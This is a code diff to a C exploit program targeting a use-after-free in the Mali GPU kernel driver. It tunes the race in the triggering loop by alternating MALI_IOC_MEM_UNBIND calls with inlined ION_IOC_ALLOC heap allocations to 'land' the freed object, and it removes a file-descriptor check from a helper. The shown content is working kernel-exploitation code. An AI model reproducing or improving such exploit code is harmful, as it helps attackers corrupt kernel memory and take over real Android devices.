@@ -199,11 +199,6 @@ void unmap_ion_buffer(buffer_info_t* buffer_info) {
 
 
 int alloc_ion_buffer(int ion_fd, size_t size, buffer_info_t* buffer_info) {
-    // Try ION first
-    if (ion_fd < 0) {
-        return 0;
-    }
-
     struct ion_allocation_data alloc_data = {0};
     alloc_data.len = size;
     alloc_data.align = 0;
@@ -536,8 +531,22 @@ int main() {
         printf("\n[6] Attempting to land UAF with %u UNBIND + ion_buffer allocation cycle(s)\n", uaf_ion_alloc_count);
         
         for (uint32_t i = spray_count; i < spray_count + uaf_ion_alloc_count; i++) {
+            struct ion_allocation_data alloc_data = {0};
+            alloc_data.len = 4096;
+            alloc_data.align = 0;
+            alloc_data.heap_id_mask = 2;  // Use heap 1
+            alloc_data.flags = 0;
+            alloc_data.handle = 0;
+
+            // keep them as close as possible to max chance of land
             ioctl(mali_fd, MALI_IOC_MEM_UNBIND, &unbind_params);
-            alloc_ion_buffer(ion_fd, 4096, &ion_buffers_for_tracking[i]);
+            ioctl(ion_fd, ION_IOC_ALLOC, &alloc_data);
+            
+            ion_buffers_for_tracking[i].handle_or_fd = alloc_data.handle;
+            ion_buffers_for_tracking[i].size = 4096;
+            ion_buffers_for_tracking[i].allocated = 1;
+            ion_buffers_for_tracking[i].mapped_addr = NULL;
+            ion_buffers_for_tracking[i].shared_fd = -1;
         }
 
 
